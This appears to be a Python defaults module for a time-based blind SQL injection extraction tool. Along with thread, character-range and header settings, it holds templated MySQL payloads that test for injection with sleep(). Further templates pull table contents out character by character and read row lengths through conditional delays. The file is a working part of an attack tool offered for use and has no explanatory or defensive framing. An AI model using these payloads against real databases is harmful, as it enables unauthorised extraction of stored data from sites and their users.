DEFAULT_MAX_THREADS = 2
"""Default number of threads to use concurrently"""
DEFAULT_THRESHOLD = 2
"""Default threshold to decide if an answer is affirmative"""
DEFAULT_MIN_CHAR = 0
"""Default min value of the range in which to search a character"""
DEFAULT_MAX_CHAR = 126
"""Default max value of the range in which to search a character"""
DEFAULT_MIN_ROW_LENGTH = 0
"""Default min value of the range in which to search the length of a row"""
DEFAULT_MAX_ROW_LENGTH = 128
"""Default max value of the range in which to search the length of a row"""
DEFAULT_MAX_INTERVAL = 0
"""Default max time to wait between each request"""
DEFAULT_UNKNOWN_CHAR = '?'
"""Default string used to replace an unknown character"""
DEFAULT_HEADERS = {
    "Cookie": "",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.2 Safari/605.1.15",
    "Connection": "keep-alive"
}
"""Default headers used in a request"""


DEFAULT_TEST_PAYLOADS = [
    "1 and 0 or sleep({sleep_time})",
    "1' and 0 or sleep({sleep_time}) -- -"
]
"""Default list of payloads to test for blind-SQLi vulnerability"""

DEFAULT_FETCH_CHAR_PAYLOADS = [
    "1 and 0 or if(ord(mid((select {column_name} from {table_name} limit {row_index},1),{char_index},1)){condition}{value}, sleep({sleep_time}), sleep(0))",
    "1' and 0 or if(ord(mid((select {column_name} from {table_name} limit {row_index},1),{char_index},1)){condition}{value}, sleep({sleep_time}), sleep(0)) -- -"
]
"""Default list of payloads to fetch a character in a position of a row"""

DEFAULT_FETCH_ROW_LENGTH_PAYLOADS = [
    "1 and 0 or if(char_length((select {column_name} from {table_name} limit {row_index},1)){condition}{value}, sleep({sleep_time}), sleep(0))",
    "1' and 0 or if(char_length((select {column_name} from {table_name} limit {row_index},1)){condition}{value}, sleep({sleep_time}), sleep(0)) -- -"
]
"""Default list of payloads to fetch the length of a row"""
